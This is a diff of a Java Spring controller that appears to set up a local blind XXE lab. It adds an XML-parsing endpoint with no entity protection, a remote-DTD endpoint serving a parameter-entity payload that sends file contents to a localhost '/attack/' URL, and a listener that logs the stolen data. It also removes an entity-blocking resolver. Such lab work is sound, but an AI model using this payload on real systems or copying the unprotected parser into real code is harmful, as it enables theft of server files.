@@ -10,30 +10,39 @@ import java.util.List;
 
 import javax.servlet.http.HttpServletRequest;
 
-import org.apache.commons.logging.Log;
-import org.apache.commons.logging.LogFactory;
 import org.dom4j.Document;
 import org.dom4j.DocumentException;
 import org.dom4j.Element;
 import org.dom4j.io.SAXReader;
-import org.springframework.web.bind.annotation.CrossOrigin;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RestController;
-import org.xml.sax.EntityResolver;
-import org.xml.sax.InputSource;
-import org.xml.sax.SAXException;
 
 import XXE.TEST.XXE.domain.User;
 
 @RestController
-@CrossOrigin
-public class XXETest {
+public class OutOfBand {
 
-    Log logger = LogFactory.getLog(XXETest.class);
+    @GetMapping("/file-data")
+    public String fileData() {
+        return "this is a password";
+    }
+
+    @GetMapping("/remote-dtd")
+    public String remoteDTD() {
+        System.out.println("remote-access");
+        return "<!ENTITY % wrapper \"<!ENTITY send SYSTEM 'http://localhost:8080/attack/%file;'>\">";
+    }
+
+    @GetMapping("/attack/{param}")
+    public String attck(@PathVariable String param) {
+        System.out.println("out-of-band data --->" + param);
+        return "";
+    }
 
     @SuppressWarnings("unchecked")
-    @PostMapping("login")
+    @PostMapping("blind-xxe")
     public User test(HttpServletRequest request) throws UnsupportedEncodingException, IOException, DocumentException {
         String value = "";
         User user = new User();
@@ -65,18 +74,6 @@ public class XXETest {
             username = el.getText();
             user.setUsername(username);
         }
-        return user;
-    }
-
-    @GetMapping("/xxe-param")
-    public String getXXEParam() {
-        return "<!ENTITY xxe SYSTEM \"file:///E:/password.txt\" >";
-    }
-}
-
-class IgnoreDTDEntityResolver implements EntityResolver {
-    @Override
-    public InputSource resolveEntity(String arg0, String arg1) throws SAXException, IOException {
-        return new InputSource(new ByteArrayInputStream("<?xml version='1.0' encoding='UTF-8'?>".getBytes()));
+        return null;
     }
 }
